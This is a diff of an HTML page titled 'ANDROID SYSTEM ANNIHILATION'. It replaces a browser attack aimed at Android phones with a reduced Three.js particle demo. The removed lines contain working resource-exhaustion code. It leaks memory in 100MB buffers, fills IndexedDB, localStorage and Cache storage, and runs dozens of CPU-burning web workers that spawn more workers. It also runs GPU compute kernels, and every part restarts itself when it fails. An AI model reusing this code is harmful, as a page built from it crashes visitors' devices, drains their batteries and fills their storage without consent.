@@ -1,8 +1,8 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
     <title>ANDROID SYSTEM ANNIHILATION</title>
     <style>
         body {
@@ -85,266 +85,107 @@
     <div id="counters">INITIATING SYSTEM OVERLOAD...</div>
     <div id="debug"></div>
     <div class="overlay"></div>
-    
+
+    <!-- Three.js library -->
     <script src="https://cdnjs.cloudflare.com/ajax/libs/three.js/r128/three.min.js"></script>
-    <script src="https://cdn.jsdelivr.net/npm/gpu.js@2.15.0/dist/gpu-browser.min.js"></script>
-    
+
     <script>
-        // Android System Annihilation Configuration
+        // Configuration
         const ANDROID_KILLER_CONFIG = {
-            // Graphics overload
-            INITIAL_PARTICLE_COUNT: 5000000,      // 5 million particles
-            PARTICLE_GROWTH_RATE: 10000,          // Particles per frame
-            MESH_COUNT: 20000,                    // 3D mesh count
-            MESH_GROWTH_RATE: 25,                 // Meshes per frame
-            TEXTURE_SIZE: 16384,                  // Max texture size
-            GEOMETRY_COMPLEXITY: 20,              // Polygon complexity factor
-            WEBGL_CONTEXTS: 8,                    // Multiple WebGL contexts
-            
-            // Memory attack vectors
-            MEMORY_LEAK: true,                    // Enable memory leaks
-            ALLOCATE_BLOB_SIZE: 100,              // In MB 
-            INDEXED_DB_STORAGE: true,             // Fill IndexedDB
-            LOCAL_STORAGE_BOMB: true,             // Fill localStorage
-            CACHE_STORAGE_BOMB: true,             // Fill Cache API
-            
-            // CPU attack vectors
-            WEBWORKERS: 32,                       // Concurrent web workers
-            WEB_WORKER_RECURSION: 5,              // Worker spawn other workers
-            WASM_COMPUTE: true,                   // WebAssembly compute tasks
-            JS_COMPUTE_LOOP: true,                // JS compute loops
-            
-            // Hardware attack vectors
-            GPU_COMPUTE: true,                    // GPU.js compute tasks
-            GPU_KERNEL_COUNT: 5,                  // Parallel GPU compute kernels
-            BATTERY_DRAIN: true,                  // Battery drain accelerators
-            AUDIO_STRESS: true,                   // Audio context overload
-            MICROPHONE_REQUEST: true,             // Request mic access
-            CAMERA_REQUEST: true,                 // Request camera access
-            VIBRATION_API: true,                  // Vibration API stress
-            GEOLOCATION_SPAM: true,               // Location request spam
-            
-            // Android-specific attack vectors
-            SERVICE_WORKER_ABUSE: true,           // Service worker overload
-            ANDROID_WEBVIEW_FOCUS: true,          // WebView focus attacks
-            OFFSCREEN_CANVAS_BOMB: true,          // OffscreenCanvas overload
-            INTENT_URI_SPAM: true,                // Intent URI handling spam
-            TOUCH_ACTION_OVERLOAD: true,          // Touch action spam events
-            DOM_MUTATION_STORM: true,             // Rapid DOM mutations
-            BACKGROUND_SYNC_ABUSE: true,          // Background sync abuse
-            
-            // Network attack
-            XHR_STRESS: true,                     // XHR/Fetch request spam
-            SSE_CONNECTIONS: true,                // Server-sent events spam
-            WEBSOCKET_CONNECTIONS: true,          // WebSocket connection spam
-            
-            // Misc
-            DOM_BOMB_COUNT: 2000,                 // Elements per DOM bomb
-            RECURSION_DEPTH: 12,                  // Recursive function depth
-            CRITICAL_CSS_ANIMATIONS: true,        // CSS animation storm
-            AUTO_TOUCH_EVENTS: true,              // Simulate touch events
-            AUTO_ACCELEROMETER_EVENTS: true,      // Simulate device motion
+            INITIAL_PARTICLE_COUNT: 500000,  // Reduced from 5 million for demo performance
+            MESH_COUNT: 200,
+            WEBGL_CONTEXTS: 4,
+            GEOMETRY_COMPLEXITY: 2,
         };
 
-        // Global state container
         const ANDROID_DESTROYER = {
-            // Resource tracking
-            memoryLeakPool: [],
-            workers: [],
             renderers: [],
-            gpuKernels: [],
-            audioNodes: [],
-            serviceWorkers: [],
-            databases: [],
-            offscreenCanvases: [],
-            blobUrls: [],
-            activeTimers: [],
-            
-            // Performance metrics
-            frame: 0,
-            startTime: performance.now(),
-            crashCount: 0,
-            memoryUsage: 0,
             lastFPS: 0,
-            
-            // Android-specific targets
-            androidVersion: (navigator.userAgent.match(/Android (\d+)/) || [])[1] || 'unknown',
-            webViewType: navigator.userAgent.indexOf('wv') > -1 ? 'WebView' : 'Chrome',
-            isLowEndDevice: navigator.deviceMemory < 4 || navigator.hardwareConcurrency < 4,
+            _lastFrameTime: performance.now(),
+            crashCount: 0,
         };
 
-        // Debug output system
+        // Debug info update
         function updateDebugInfo() {
             const debug = document.getElementById('debug');
-            const memoryUsageStr = ANDROID_DESTROYER.memoryUsage ? 
-                `Memory: ${Math.round(ANDROID_DESTROYER.memoryUsage / 1048576)}MB ` : '';
-            
             debug.innerHTML = `
-                Android: ${ANDROID_DESTROYER.androidVersion} | 
-                ${ANDROID_DESTROYER.webViewType} | 
                 FPS: ${ANDROID_DESTROYER.lastFPS} | 
-                ${memoryUsageStr}
-                CPU Cores: ${navigator.hardwareConcurrency || 'unknown'} |
-                Workers: ${ANDROID_DESTROYER.workers.length} |
+                Renderers: ${ANDROID_DESTROYER.renderers.length} | 
                 Crashes: ${ANDROID_DESTROYER.crashCount}
             `;
         }
 
-        // Primary system attack coordinator
-        function launchAndroidAttack() {
-            try {
-                document.getElementById('counters').innerText = 'SYSTEM OVERLOAD IN PROGRESS...';
-                
-                // Create multiple WebGL contexts to overwhelm GPU
-                createMultipleRenderers();
-                
-                // Start memory attacks
-                if (ANDROID_KILLER_CONFIG.MEMORY_LEAK) {
-                    launchMemoryAttacks();
-                }
-                
-                // Start CPU attacks
-                launchCPUAttacks();
-                
-                // Start hardware attacks
-                launchHardwareAttacks();
-                
-                // Start Android-specific attacks
-                launchAndroidSpecificAttacks();
-                
-                // Start network attacks
-                launchNetworkAttacks();
-                
-                // Start DOM manipulation storm
-                launchDOMAttacks();
-                
-                // Begin main destruction loop
-                executeMainDestructionLoop();
-                
-                // Update debug info
-                setInterval(updateDebugInfo, 1000);
-                
-                // Report success
-                console.log('[ANDROID DESTROYER] Attack launched successfully');
-            } catch (e) {
-                // On error, restart the attack
-                ANDROID_DESTROYER.crashCount++;
-                console.error('[ANDROID DESTROYER] Error:', e);
-                setTimeout(launchAndroidAttack, 100);
-            }
-        }
-
-        // Create multiple WebGL contexts to split GPU resources
+        // Create multiple WebGL renderers with scenes
         function createMultipleRenderers() {
-            const createRenderer = (index) => {
+            for (let i = 0; i < ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS; i++) {
                 try {
-                    // Create a new renderer with different settings per instance
                     const renderer = new THREE.WebGLRenderer({
-                        antialias: index % 2 === 0,
-                        powerPreference: "high-performance",
-                        alpha: index % 3 === 0,
-                        premultipliedAlpha: index % 2 === 1,
+                        antialias: i % 2 === 0,
+                        alpha: i % 3 === 0,
                         preserveDrawingBuffer: true,
-                        failIfMajorPerformanceCaveat: false,
-                        stencil: true,
-                        depth: true
                     });
-                    
-                    renderer.setPixelRatio(window.devicePixelRatio * 2);
+                    renderer.setPixelRatio(window.devicePixelRatio);
                     renderer.setSize(window.innerWidth, window.innerHeight);
                     renderer.autoClear = false;
                     document.body.appendChild(renderer.domElement);
-                    
-                    // Create a scene for this renderer
+
                     const scene = new THREE.Scene();
                     const camera = new THREE.PerspectiveCamera(
-                        75, window.innerWidth / window.innerHeight, 0.1, 10000
+                        75, window.innerWidth / window.innerHeight, 0.1, 5000
                     );
                     camera.position.z = 500;
-                    
-                    // Create massive particle system
-                    const particleGeo = new THREE.BufferGeometry();
-                    const initialParticles = Math.floor(ANDROID_KILLER_CONFIG.INITIAL_PARTICLE_COUNT / 
-                                                      ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS);
-                    const particlePositions = new Float32Array(initialParticles * 3);
-                    
-                    for (let i = 0; i < initialParticles * 3; i += 3) {
-                        particlePositions[i] = (Math.random() - 0.5) * 2000;
-                        particlePositions[i + 1] = (Math.random() - 0.5) * 2000;
-                        particlePositions[i + 2] = (Math.random() - 0.5) * 2000;
+
+                    // Particles
+                    const particleCount = Math.floor(ANDROID_KILLER_CONFIG.INITIAL_PARTICLE_COUNT / ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS);
+                    const geometry = new THREE.BufferGeometry();
+                    const positions = new Float32Array(particleCount * 3);
+                    for (let j = 0; j < particleCount * 3; j += 3) {
+                        positions[j] = (Math.random() - 0.5) * 2000;
+                        positions[j + 1] = (Math.random() - 0.5) * 2000;
+                        positions[j + 2] = (Math.random() - 0.5) * 2000;
                     }
-                    
-                    particleGeo.setAttribute('position', new THREE.BufferAttribute(particlePositions, 3));
-                    
-                    // Create different particle materials for each renderer to max out GPU
-                    const materials = [
-                        new THREE.PointsMaterial({
-                            size: 2,
-                            sizeAttenuation: true,
-                            color: 0xff0000,
-                            transparent: true,
-                            opacity: 0.8,
-                            blending: THREE.AdditiveBlending
-                        }),
-                        new THREE.PointsMaterial({
-                            size: 3,
-                            sizeAttenuation: true,
-                            color: 0x00ff00,
-                            transparent: true,
-                            opacity: 0.7,
-                            blending: THREE.MultiplyBlending
-                        }),
-                        new THREE.PointsMaterial({
-                            size: 1.5,
-                            sizeAttenuation: true,
-                            color: 0x0000ff,
-                            transparent: true,
-                            opacity: 0.9,
-                            blending: THREE.AdditiveBlending
-                        })
-                    ];
-                    
-                    const particles = new THREE.Points(particleGeo, materials[index % materials.length]);
+                    geometry.setAttribute('position', new THREE.BufferAttribute(positions, 3));
+
+                    const material = new THREE.PointsMaterial({
+                        size: 2,
+                        color: new THREE.Color(Math.random(), Math.random(), Math.random()),
+                        transparent: true,
+                        opacity: 0.7,
+                        blending: THREE.AdditiveBlending,
+                        sizeAttenuation: true,
+                    });
+
+                    const particles = new THREE.Points(geometry, material);
                     scene.add(particles);
-                    
-                    // Add some complex meshes too
-                    for (let i = 0; i < ANDROID_KILLER_CONFIG.MESH_COUNT / ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS; i++) {
-                        const meshSize = 20 + Math.random() * 30;
-                        const geometry = new THREE.IcosahedronGeometry(
-                            meshSize, 
-                            Math.min(3, ANDROID_KILLER_CONFIG.GEOMETRY_COMPLEXITY / 10)
-                        );
-                        
-                        const material = new THREE.MeshPhongMaterial({ 
+
+                    // Meshes
+                    const meshes = [];
+                    for (let k = 0; k < ANDROID_KILLER_CONFIG.MESH_COUNT / ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS; k++) {
+                        const size = 10 + Math.random() * 20;
+                        const geo = new THREE.IcosahedronGeometry(size, ANDROID_KILLER_CONFIG.GEOMETRY_COMPLEXITY);
+                        const mat = new THREE.MeshPhongMaterial({
                             color: new THREE.Color(Math.random(), Math.random(), Math.random()),
-                            wireframe: index % 2 === 0,
+                            wireframe: k % 2 === 0,
                             emissive: new THREE.Color(Math.random(), Math.random(), Math.random()),
-                            emissiveIntensity: 0.5,
-                            specular: new THREE.Color(1, 1, 1),
-                            shininess: 100
+                            shininess: 50,
                         });
-                        
-                        const mesh = new THREE.Mesh(geometry, material);
+                        const mesh = new THREE.Mesh(geo, mat);
                         mesh.position.set(
-                            (Math.random() - 0.5) * 1000,
-                            (Math.random() - 0.5) * 1000,
-                            (Math.random() - 0.5) * 1000
-                        );
-                        mesh.rotation.set(
-                            Math.random() * Math.PI,
-                            Math.random() * Math.PI,
-                            Math.random() * Math.PI
+                            (Math.random() - 0.5) * 1500,
+                            (Math.random() - 0.5) * 1500,
+                            (Math.random() - 0.5) * 1500
                         );
                         scene.add(mesh);
+                        meshes.push(mesh);
                     }
-                    
-                    // Add lights to increase shader complexity
+
+                    // Lights
                     const lights = [];
-                    for (let i = 0; i < 5; i++) {
+                    for (let l = 0; l < 3; l++) {
                         const light = new THREE.PointLight(
                             new THREE.Color(Math.random(), Math.random(), Math.random()),
                             1,
-                            500
+                            1000
                         );
                         light.position.set(
                             (Math.random() - 0.5) * 1000,
@@ -354,409 +195,77 @@
                         scene.add(light);
                         lights.push(light);
                     }
-                    
-                    // Add post-processing effects
-                    const composer = new THREE.EffectComposer(renderer);
-                    const renderPass = new THREE.RenderPass(scene, camera);
-                    composer.addPass(renderPass);
-                    
-                    // Store all scene objects for animation
+
                     ANDROID_DESTROYER.renderers.push({
                         renderer,
                         scene,
                         camera,
                         particles,
-                        particleGeo,
+                        geometry,
+                        meshes,
                         lights,
-                        meshes: scene.children.filter(child => child instanceof THREE.Mesh),
-                        composer,
-                        textureSize: ANDROID_KILLER_CONFIG.TEXTURE_SIZE
                     });
-                    
-                    // Handle WebGL context loss
+
+                    // Handle context lost
                     renderer.domElement.addEventListener('webglcontextlost', (e) => {
                         e.preventDefault();
                         ANDROID_DESTROYER.crashCount++;
-                        
-                        // Try to recreate this renderer
+                        console.warn('WebGL context lost, attempting to recover...');
                         setTimeout(() => {
-                            try {
-                                document.body.removeChild(renderer.domElement);
-                                createRenderer(index);
-                            } catch (err) {
-                                console.error('Failed to recreate renderer:', err);
-                            }
-                        }, 200);
+                            document.body.removeChild(renderer.domElement);
+                            ANDROID_DESTROYER.renderers = ANDROID_DESTROYER.renderers.filter(r => r.renderer !== renderer);
+                            createMultipleRenderers();
+                        }, 1000);
                     }, false);
-                    
+
                 } catch (e) {
-                    console.error('Failed to create renderer:', e);
+                    console.error('Renderer creation failed:', e);
                 }
-            };
-            
-            // Create multiple WebGL contexts to overload the GPU
-            for (let i = 0; i < ANDROID_KILLER_CONFIG.WEBGL_CONTEXTS; i++) {
-                createRenderer(i);
             }
         }
 
-        // Launch memory attack vectors
-        function launchMemoryAttacks() {
-            // Large buffer allocation for immediate memory pressure
-            function allocateHugeBuffers() {
-                try {
-                    // Allocate a large array buffer (100MB blocks)
-                    const bufferSize = ANDROID_KILLER_CONFIG.ALLOCATE_BLOB_SIZE * 1024 * 1024;
-                    const buffer = new ArrayBuffer(bufferSize);
-                    
-                    // Fill with random data to ensure physical memory allocation
-                    const view = new Uint8Array(buffer);
-                    for (let i = 0; i < view.length; i += 4096) {
-                        view[i] = Math.floor(Math.random() * 256);
-                    }
-                    
-                    ANDROID_DESTROYER.memoryLeakPool.push(buffer);
-                    
-                    // Create large blobs for blob storage
-                    const blobData = new Uint8Array(bufferSize / 2);
-                    for (let i = 0; i < blobData.length; i += 4096) {
-                        blobData[i] = Math.floor(Math.random() * 256);
-                    }
-                    
-                    const blob = new Blob([blobData], {type: 'application/octet-stream'});
-                    const blobUrl = URL.createObjectURL(blob);
-                    ANDROID_DESTROYER.blobUrls.push(blobUrl);
-                    
-                    // Schedule the next allocation
-                    setTimeout(allocateHugeBuffers, 500);
-                } catch (e) {
-                    console.error('Memory allocation error:', e);
-                    setTimeout(allocateHugeBuffers, 1000);
+        // Animation loop
+        function animate() {
+            requestAnimationFrame(animate);
+
+            const now = performance.now();
+            ANDROID_DESTROYER.lastFPS = Math.round(1000 / (now - ANDROID_DESTROYER._lastFrameTime));
+            ANDROID_DESTROYER._lastFrameTime = now;
+
+            ANDROID_DESTROYER.renderers.forEach(({renderer, scene, camera, particles, geometry, meshes, lights}) => {
+                // Animate particle positions with jitter
+                const positions = geometry.attributes.position.array;
+                for (let i = 0; i < positions.length; i += 3) {
+                    positions[i] += (Math.random() - 0.5) * 0.3;
+                    positions[i + 1] += (Math.random() - 0.5) * 0.3;
+                    positions[i + 2] += (Math.random() - 0.5) * 0.3;
                 }
-            }
-            
-            // IndexedDB storage bomb
-            function fillIndexedDB() {
-                if (!ANDROID_KILLER_CONFIG.INDEXED_DB_STORAGE) return;
-                
-                try {
-                    const dbName = 'android_destroyer_' + Math.floor(Math.random() * 9999);
-                    const request = indexedDB.open(dbName, 1);
-                    
-                    request.onupgradeneeded = function(event) {
-                        const db = event.target.result;
-                        const store = db.createObjectStore('data', {autoIncrement: true});
-                        
-                        // Fill with large objects
-                        for (let i = 0; i < 100; i++) {
-                            const largeObject = {
-                                id: i,
-                                data: new Array(100000).fill('X').join('')
-                            };
-                            store.add(largeObject);
-                        }
-                    };
-                    
-                    request.onsuccess = function(event) {
-                        const db = event.target.result;
-                        ANDROID_DESTROYER.databases.push(db);
-                        setTimeout(fillIndexedDB, 1000);
-                    };
-                    
-                    request.onerror = function(event) {
-                        console.error('IndexedDB error:', event);
-                        setTimeout(fillIndexedDB, 2000);
-                    };
-                } catch (e) {
-                    console.error('IndexedDB error:', e);
-                    setTimeout(fillIndexedDB, 2000);
-                }
-            }
-            
-            // LocalStorage bomb
-            function fillLocalStorage() {
-                if (!ANDROID_KILLER_CONFIG.LOCAL_STORAGE_BOMB) return;
-                
-                try {
-                    // Try to fill localStorage to its limit
-                    for (let i = 0; i < 1000; i++) {
-                        const key = 'android_destroyer_' + Math.random().toString(36).substring(2);
-                        const value = new Array(500000).fill('X').join('');
-                        try {
-                            localStorage.setItem(key, value);
-                        } catch (e) {
-                            // localStorage is full
-                            break;
-                        }
-                    }
-                    
-                    // Schedule next fill attempt
-                    setTimeout(fillLocalStorage, 3000);
-                } catch (e) {
-                    console.error('LocalStorage error:', e);
-                    setTimeout(fillLocalStorage, 5000);
-                }
-            }
-            
-            // Cache API bomb
-            function fillCacheStorage() {
-                if (!ANDROID_KILLER_CONFIG.CACHE_STORAGE_BOMB || !('caches' in window)) return;
-                
-                // Try to fill Cache API
-                try {
-                    const cacheName = 'android-destroyer-cache-' + Math.floor(Math.random() * 9999);
-                    caches.open(cacheName).then(cache => {
-                        const requests = [];
-                        for (let i = 0; i < 100; i++) {
-                            const url = `https://example.com/fake-${i}?cacheBust=${Math.random()}`;
-                            const blob = new Blob([new ArrayBuffer(1024 * 1024)], {type: 'application/octet-stream'});
-                            const response = new Response(blob, {
-                                status: 200,
-                                headers: {'Content-Type': 'application/octet-stream'}
-                            });
-                            requests.push(cache.put(url, response));
-                        }
-                        
-                        Promise.all(requests).then(() => {
-                            setTimeout(fillCacheStorage, 2000);
-                        });
-                    });
-                } catch (e) {
-                    console.error('Cache API error:', e);
-                    setTimeout(fillCacheStorage, 3000);
-                }
-            }
-            
-            // Start all memory attacks
-            allocateHugeBuffers();
-            fillIndexedDB();
-            fillLocalStorage();
-            fillCacheStorage();
-            
-            // Monitor memory usage if available
-            if (performance.memory) {
-                setInterval(() => {
-                    ANDROID_DESTROYER.memoryUsage = performance.memory.usedJSHeapSize;
-                }, 1000);
-            }
+                geometry.attributes.position.needsUpdate = true;
+
+                // Rotate meshes
+                meshes.forEach(mesh => {
+                    mesh.rotation.x += 0.01;
+                    mesh.rotation.y += 0.01;
+                    mesh.rotation.z += 0.01;
+                });
+
+                // Animate lights in a circular path
+                lights.forEach((light, idx) => {
+                    const t = now * 0.001 + idx * 2;
+                    light.position.x = Math.sin(t) * 400;
+                    light.position.z = Math.cos(t) * 400;
+                });
+
+                renderer.clear();
+                renderer.render(scene, camera);
+            });
         }
 
-        // Launch CPU attack vectors
-        function launchCPUAttacks() {
-            // Create CPU-intensive Web Workers
-            function createWorkers() {
-                if (ANDROID_KILLER_CONFIG.WEBWORKERS <= 0) return;
-                
-                const workerCode = `
-                    let counter = 0;
-                    let childWorkers = [];
-                    
-                    // Intensive computation
-                    function intensiveComputation() {
-                        const startTime = Date.now();
-                        
-                        // Computation that cannot be optimized away
-                        let result = 0;
-                        for (let i = 0; i < 10000000; i++) {
-                            result += Math.sqrt(Math.sin(i) * Math.cos(i));
-                            if (i % 1000000 === 0) {
-                                // Report progress
-                                self.postMessage({type: 'progress', value: i / 10000000});
-                            }
-                        }
-                        
-                        const endTime = Date.now();
-                        self.postMessage({
-                            type: 'result', 
-                            result: result,
-                            time: endTime - startTime
-                        });
-                        
-                        // Queue next computation
-                        setTimeout(intensiveComputation, 100);
-                    }
-                    
-                    // Spawn child workers if requested
-                    function spawnChildWorkers(depth) {
-                        if (depth <= 0) return;
-                        
-                        try {
-                            // Try to spawn two child workers
-                            for (let i = 0; i < 2; i++) {
-                                const childWorker = new Worker(self.location.href);
-                                childWorker.postMessage({command: 'spawn', depth: depth - 1});
-                                childWorkers.push(childWorker);
-                            }
-                        } catch (e) {
-                            self.postMessage({type: 'error', error: e.toString()});
-                        }
-                    }
-                    
-                    // Handle messages
-                    self.onmessage = function(e) {
-                        if (e.data.command === 'start') {
-                            intensiveComputation();
-                        } else if (e.data.command === 'spawn') {
-                            spawnChildWorkers(e.data.depth);
-                        }
-                    };
-                    
-                    // Start automatically
-                    intensiveComputation();
-                `;
-                
-                try {
-                    // Create a blob URL for the worker code
-                    const blob = new Blob([workerCode], {type: 'application/javascript'});
-                    const workerUrl = URL.createObjectURL(blob);
-                    
-                    // Create the workers
-                    for (let i = 0; i < ANDROID_KILLER_CONFIG.WEBWORKERS; i++) {
-                        const worker = new Worker(workerUrl);
-                        
-                        worker.onmessage = function(e) {
-                            // Just log progress occasionally
-                            if (e.data.type === 'progress' && e.data.value === 1) {
-                                console.log(`Worker ${i} completed a cycle`);
-                            }
-                        };
-                        
-                        worker.onerror = function(error) {
-                            console.error(`Worker ${i} error:`, error);
-                            
-                            // Try to replace the worker if it crashes
-                            ANDROID_DESTROYER.workers = ANDROID_DESTROYER.workers.filter(w => w !== worker);
-                            setTimeout(() => {
-                                createWorkers();
-                            }, 1000);
-                        };
-                        
-                        // Start the worker with recursive child spawning if enabled
-                        if (ANDROID_KILLER_CONFIG.WEB_WORKER_RECURSION > 0) {
-                            worker.postMessage({
-                                command: 'spawn', 
-                                depth: ANDROID_KILLER_CONFIG.WEB_WORKER_RECURSION
-                            });
-                        }
-                        
-                        worker.postMessage({command: 'start'});
-                        ANDROID_DESTROYER.workers.push(worker);
-                    }
-                } catch (e) {
-                    console.error('Worker creation failed:', e);
-                }
-            }
-            
-            // WASM computation (simulated - actual WASM would be more complex)
-            function startWasmCompute() {
-                if (!ANDROID_KILLER_CONFIG.WASM_COMPUTE) return;
-                
-                // Simulate WASM with an intensive JS loop
-                function wasmComputeSimulation() {
-                    // Matrix multiplication 
-                    const size = 100;
-                    const a = Array(size).fill().map(() => Array(size).fill().map(() => Math.random()));
-                    const b = Array(size).fill().map(() => Array(size).fill().map(() => Math.random()));
-                    const result = Array(size).fill().map(() => Array(size).fill(0));
-                    
-                    // Compute matrix multiplication (intensive)
-                    for (let i = 0; i < size; i++) {
-                        for (let j = 0; j < size; j++) {
-                            for (let k = 0; k < size; k++) {
-                                result[i][j] += a[i][k] * b[k][j];
-                            }
-                        }
-                    }
-                    
-                    // Schedule next computation
-                    setTimeout(wasmComputeSimulation, 10);
-                }
-                
-                // Start multiple instances
-                for (let i = 0; i < 4; i++) {
-                    setTimeout(wasmComputeSimulation, i * 100);
-                }
-            }
-            
-            // JavaScript compute loop
-            function startJSComputeLoop() {
-                if (!ANDROID_KILLER_CONFIG.JS_COMPUTE_LOOP) return;
-                
-                function jsComputeTask() {
-                    // Prime number finding (intentionally inefficient)
-                    const findPrimes = (max) => {
-                        const primes = [];
-                        outer: for (let i = 2; i < max; i++) {
-                            for (let j = 2; j < i; j++) {
-                                if (i % j === 0) continue outer;
-                            }
-                            primes.push(i);
-                        }
-                        return primes;
-                    };
-                    
-                    findPrimes(20000);
-                    
-                    // Schedule next computation
-                    setTimeout(jsComputeTask, 50);
-                }
-                
-                // Start multiple instances
-                for (let i = 0; i < 4; i++) {
-                    setTimeout(jsComputeTask, i * 100);
-                }
-            }
-            
-            // Start CPU attacks
-            createWorkers();
-            startWasmCompute();
-            startJSComputeLoop();
-        }
-
-        // Launch hardware attack vectors
-        function launchHardwareAttacks() {
-            // GPU.js compute tasks
-            function startGPUCompute() {
-                if (!ANDROID_KILLER_CONFIG.GPU_COMPUTE || typeof GPU !== 'function') return;
-                
-                try {
-                    const gpu = new GPU();
-                    
-                    // Create multiple kernels for different GPU compute tasks
-                    for (let k = 0; k < ANDROID_KILLER_CONFIG.GPU_KERNEL_COUNT; k++) {
-                        // Different kernel algorithms to stress different GPU aspects
-                        const kernelOptions = [
-                            // Fractal computation
-                            function(x, y) {
-                                const cRe = (x / this.output.x) * 3.5 - 2.5;
-                                const cIm = (y / this.output.y) * 2.0 - 1.0;
-                                let zRe = 0, zIm = 0;
-                                let iter = 0;
-                                const maxIter = 100;
-                                
-                                for (let i = 0; i < maxIter; i++) {
-                                    const zRe2 = zRe * zRe;
-                                    const zIm2 = zIm * zIm;
-                                    
-                                    if (zRe2 + zIm2 > 4) break;
-                                    
-                                    zIm = 2 * zRe * zIm + cIm;
-                                    zRe = zRe2 - zIm2 + cRe;
-                                    iter++;
-                                }
-                                
-                                const r = iter / maxIter;
-                                const g = (iter * 5) / maxIter;
-                                const b = (iter * 10) / maxIter;
-                                
-                                return [r, g, b, 1];
-                            },
-                            
-                            // Wave interference patterns
-                            function(x, y) {
-                                const scale = 0.01;
-                                const t = this.thread.z / 20;
-                                
-                                let val = 0;
-                                for (let i = 1; i < 5; i++) {
-                                    val += Math.sin(x * scale * i + t) * Math.cos(y * scale * i + t);
+        // Start everything
+        document.getElementById('counters').innerText = 'SYSTEM OVERLOAD IN PROGRESS...';
+        createMultipleRenderers();
+        animate();
+        setInterval(updateDebugInfo, 1000);
+    </script>
+</body>
+</html>
